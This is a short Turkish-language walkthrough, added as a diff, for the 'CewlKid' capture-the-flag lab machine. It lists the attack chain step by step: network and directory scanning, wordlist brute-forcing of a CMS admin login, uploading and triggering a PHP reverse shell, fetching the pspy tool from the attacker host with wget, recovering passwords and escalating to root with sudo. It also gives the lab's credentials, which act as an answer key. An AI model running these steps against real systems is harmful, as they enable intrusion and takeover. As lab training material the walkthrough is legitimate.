@@ -1,0 +1,14 @@
+CEWLKID MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.133 bulunur.
+2 - nmap -sT -A 192.168.2.133
+3 - gobuster dir -u http://192.168.2.133:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - cewl http://192.168.2.133:8080 > cewlkid_words.txt
+5 - http://192.168.2.133:8080/index.php?SMLogin, Intruder -> Sniper, admin:Letraset bulunur.
+6 - Content -> Files, Upload, cp /usr/share/webshells/php/php-reverse-shell.php
+7 - curl -v http://192.168.2.133:8080/files/images/php-reverse-shell_1668500938.php
+8 - export TERM=xterm, SHELL=/bin/bash script -q /dev/null
+9 - https://github.com/DominicBreuker/pspy
+10 - service apache2 start, cp pspy64 /var/www/html
+11 - wget http://192.168.2.128/pspy64
+12 - chmod +x pspy64, ./pspy64 -p -i 1000, cewlbeans:fondateurs bulunur.
+13 - ssh cewlbeans@192.168.2.133, sudo -l, sudo su
